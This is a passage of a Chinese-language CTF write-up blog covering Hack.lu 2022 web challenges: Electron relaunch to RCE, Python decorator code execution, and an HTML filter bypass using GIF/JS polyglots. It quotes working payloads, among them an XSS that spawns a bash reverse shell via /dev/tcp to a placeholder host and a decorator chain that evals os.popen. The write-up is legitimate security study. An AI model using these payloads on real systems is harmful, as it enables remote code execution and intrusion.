<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>Hack. lu CTF 2022 筆記 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


            
<link href="https://blog.huli.tw/2022/10/31/en/hacklu-ctf-2022-writeup/" rel="alternate" hreflang="en" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/">
    





    <meta name="description" content="被 web 題電得亂七八糟，基本上什麼都沒解出來。題目的品質都很不錯，學到很多新東西，值得記錄一下。 關鍵字：  Electron relaunch to RCE 利用 Python decorator 執行程式碼 透過特殊檔名讓 Apache 不輸出 content type header GIF + JS polyglot 繞過 SQLite 不合法欄位名稱 JS 註解 &lt;!--  su">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack. lu CTF 2022 筆記">
<meta property="og:url" content="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="被 web 題電得亂七八糟，基本上什麼都沒解出來。題目的品質都很不錯，學到很多新東西，值得記錄一下。 關鍵字：  Electron relaunch to RCE 利用 Python decorator 執行程式碼 透過特殊檔名讓 Apache 不輸出 content type header GIF + JS polyglot 繞過 SQLite 不合法欄位名稱 JS 註解 &lt;!--  su">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/hacklu-ctf-2022-writeup/cover.png">
<meta property="article:published_time" content="2022-10-31T12:05:37.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.481Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/hacklu-ctf-2022-writeup/cover.png">



<link rel="alternative" href="/atom.xml" title="Hack. lu CTF 2022 筆記" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#babyelectron21-solves">1&nbsp;&nbsp;<b>babyelectron(21 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#culinary-class-room6-solves">2&nbsp;&nbsp;<b>Culinary Class Room(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#yummygifs5-solves">3&nbsp;&nbsp;<b>YummyGIFs(5 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#foodapi4-solves">4&nbsp;&nbsp;<b>foodAPI(4 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#htpl3-solves">5&nbsp;&nbsp;<b>HTPL(3 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#jaason6-solves">6&nbsp;&nbsp;<b>JaaSon(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#後記">7&nbsp;&nbsp;<b>後記</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2022/10/31/en/hacklu-ctf-2022-writeup/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Hack. lu CTF 2022 筆記
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-10-31T12:05:37.000Z" itemprop="datePublished">2022年10月31日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>被 web 題電得亂七八糟，基本上什麼都沒解出來。題目的品質都很不錯，學到很多新東西，值得記錄一下。</p>
<p>關鍵字：</p>
<ol>
<li>Electron relaunch to RCE</li>
<li>利用 Python decorator 執行程式碼</li>
<li>透過特殊檔名讓 Apache 不輸出 content type header</li>
<li>GIF + JS polyglot</li>
<li>繞過 SQLite 不合法欄位名稱</li>
<li>JS 註解 <code>&lt;!--</code> </li>
<li>superjson</li>
</ol>
<span id="more"></span>

<h2><span id="babyelectron21-solves">babyelectron(21 solves)</span></h2><p>給你一個 Electron 的 app，目標是 RCE，有一個 bot 會用 app 訪問你的頁面，然後要先找到一個 XSS，這段就先不提了。</p>
<p>這題該開的 security 設置都有開，關鍵是在 preload 裡面有一段這個：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> RendererApi <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">invoke</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">action<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span>  <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"RELaction"</span><span class="token punctuation">,</span>action<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// SECURITY: expose a limted API to the renderer over the context bridge</span>
<span class="token comment">// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3</span>
contextBridge<span class="token punctuation">.</span><span class="token function">exposeInMainWorld</span><span class="token punctuation">(</span><span class="token string">"api"</span><span class="token punctuation">,</span> RendererApi<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在另外一個 JS 則有這樣一段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// In this file you can include the rest of your app's specific main process</span>
<span class="token comment">// code. You can also put them in separate files and require them here.</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELbuy</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">listingId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELsell</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">houseId<span class="token punctuation">,</span> price<span class="token punctuation">,</span> duration</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELinfo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">houseId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RElist</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">listingId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELsummary</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">userId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span> 
<span class="token punctuation">&#125;</span>

ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"RELaction"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">_e<span class="token punctuation">,</span> action<span class="token punctuation">,</span> args</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
  <span class="token comment">//if(["RELbuy", "RELsell", "RELinfo"].includes(action))&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^REL</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    app<span class="token punctuation">[</span>action<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>  
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// ?? </span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起來沒什麼用，因為那些方法都沒實作。</p>
<p>但重點是你送 <code>relaunch</code> 的指令進去也會 match 到，所以你可以執行 <a target="_blank" rel="noopener" href="https://www.electronjs.org/de/docs/latest/api/app#apprelaunchoptions">app.relaunch</a>，在 relaunch 的時候可以指定執行檔位置，就可以 RCE。</p>
<p>DC 裡面 zeyu2001 提供的 payload：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token string-property property">"houseId"</span><span class="token operator">:</span><span class="token string">"..."</span><span class="token punctuation">,</span>
  <span class="token string-property property">"token"</span><span class="token operator">:</span><span class="token string">"..."</span><span class="token punctuation">,</span>
  <span class="token string-property property">"message"</span><span class="token operator">:</span><span class="token string">"&lt;img src=x onerror=\"window.api.invoke('relaunch',&#123;execPath: 'bash', args: ['-c', 'bash -i >&amp; /dev/tcp/HOST/PORT 0>&amp;1']&#125;)\">"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"price"</span><span class="token operator">:</span><span class="token string">""</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Sudistark 的 writeup：<a target="_blank" rel="noopener" href="https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md">https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md</a></p>
<h2><span id="culinary-class-room6-solves">Culinary Class Room(6 solves)</span></h2><p>這題限制你只能幫一個 class 加上最多 250 個 decorators，而且不能有參數，目標是要能夠執行任意程式碼拿到 flag。</p>
<p>作者的解法是找到一個 list 然後往裡面 push 很多數字，最後丟到 bytes 以後再丟到 eval 去執行，例如說以下程式碼會往 <code>copyright._Printer__filenames</code> push 112 這個數字</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span>
<span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span>
<span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>底下是來自 Arusekk 在 DC 貼的 payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@list</span>
<span class="token decorator annotation punctuation">@eval</span>
<span class="token decorator annotation punctuation">@bytes</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>__add__</span>
<span class="token decorator annotation punctuation">@list</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@chr</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@StopAsyncIteration<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@len<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@int<span class="token punctuation">.</span>real<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>strip</span>
<span class="token decorator annotation punctuation">@len<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@ValueError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@Exception<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@StopIteration<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@open<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@set<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@Exception<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@__import__<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>__add__</span>
<span class="token decorator annotation punctuation">@str</span>
<span class="token decorator annotation punctuation">@tuple</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>split</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>lower</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>rstrip</span>
<span class="token decorator annotation punctuation">@TypeError<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的就是在做：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">b'__import__("os",).popen("./rea*")'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因為對 Python 極度不熟，所以來惡補一下。</p>
<p><code>__doc__</code> 可以拿到一個 method 的文件，要在 source code 裡面宣告，像這樣：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""hello"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>__doc__<span class="token punctuation">)</span> <span class="token comment"># hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>原來 Python 有這麼好用的功能，看起來在開發上滿實用的，要輸出成文件什麼的應該比較容易</p>
<p>然後在 Python 裡面可以用 <code>__builtins__</code> 拿到內建的所有東西，感覺有點像是 js 的 global 那樣，可以看出有哪些東西可以用。</p>
<p>用 <code>dir()</code> 可以列出所有屬性，所以可以自己寫一個遞迴去找出 list，像這樣：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">visited <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">:</span>
    item <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
    new_path <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> name
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>new_path<span class="token punctuation">)</span>
      <span class="token keyword">return</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> visited<span class="token punctuation">:</span>
      visited<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
      search<span class="token punctuation">(</span>item<span class="token punctuation">,</span> new_path<span class="token punctuation">)</span>
      
search<span class="token punctuation">(</span>__builtins__<span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最後就會找到 <code>__builtins__.copyright._Printer__filenames</code> 這個存在於 global 的 list。</p>
<p>而上面貼的解法，找到數字之後用 <code>@copyright._Printer__filenames.append</code> 丟進去陣列，回傳值是 <code>None</code>，然後利用 <code>&quot;abc&quot;.format(None)</code> 還是 “abc” 的特性，就可以再把 input 變成想要的字串，然後用 len 去拿到數字。</p>
<h2><span id="yummygifs5-solves">YummyGIFs(5 solves)</span></h2><p>可以上傳一張 gif（有經過嚴格檢查，要真的是 gif 檔）並搭配標題跟敘述，敘述會過濾之後 render 在畫面上：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">s</span><span class="token punctuation">(</span><span class="token variable">$input_str</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token variable">$allowed_tags</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'&lt;b>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/b>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;i>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/i>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;u>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/u>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;s>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/s>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$current_str</span> <span class="token operator">=</span> <span class="token variable">$input_str</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$new_str</span> <span class="token operator">=</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;.*?>/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$allowed_tags</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allowed_tags</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$current_str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$new_str</span> <span class="token operator">===</span> <span class="token variable">$current_str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$new_str</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$current_str</span> <span class="token operator">=</span> <span class="token variable">$new_str</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起來很嚴格，但其實可以用未閉合的標籤繞過，像這樣：<code>&lt;script src=&quot;&quot; p=&quot;</code>，所以還是可以插入任意 tag。</p>
<p>接下來問題就是要怎麼讓 src 合法，因為有 CSP self 的關係，所以我們要產生出一個又是 GIF 但又是合法的 JS code，但儘管產出了，因為 content type 是 image&#x2F;gif，所以瀏覽器還是會報錯，會出現：</p>
<blockquote>
<p>Refused to execute script from ‘<a target="_blank" rel="noopener" href="http://localhost:1234/a.gif">http://localhost:1234/a.gif</a>‘ because its MIME type (‘image&#x2F;gif’) is not executable.</p>
</blockquote>
<p>而解法就是想辦法不要輸出 content type 就好。</p>
<p>因為這個 content type 是 Apache 給的，可以用檔名來繞過，例如說檔名是 <code>..gif</code>，就不會給 content type，可參考：<a target="_blank" rel="noopener" href="https://twitter.com/YNizry/status/1582733545759330306">https://twitter.com/YNizry/status/1582733545759330306</a></p>
<p>這招感覺滿值得筆記下來的。</p>
<p>至於怎麼產生 gif + js polyglot，可以參考：<a target="_blank" rel="noopener" href="https://gist.github.com/ajinabraham/f2a057fb1930f94886a3">https://gist.github.com/ajinabraham/f2a057fb1930f94886a3</a></p>
<p>順便在這篇順便筆記一下 png 的：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !</a></p>
<h2><span id="foodapi4-solves">foodAPI(4 solves)</span></h2><p>這題的核心程式碼就這一段：</p>
